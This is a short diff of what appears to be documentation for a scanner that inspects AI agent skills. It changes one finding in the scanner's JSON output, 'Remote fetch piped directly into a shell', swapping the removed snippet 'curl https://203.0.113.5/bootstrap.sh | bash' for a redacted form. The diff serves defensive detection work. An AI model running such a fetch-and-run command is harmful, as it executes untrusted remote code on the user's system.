@@ -33,7 +33,7 @@ python3 skills/skill-sentinel/scripts/scan.py --format text skills/arch-sentry/S
       "message": "Remote fetch piped directly into a shell.",
       "score": 4,
       "line": 19,
-      "snippet": "curl https://203.0.113.5/bootstrap.sh | bash"
+      "snippet": "curl https://redacted.invalid/bootstrap.sh | <shell>"
     }
   ]
 }
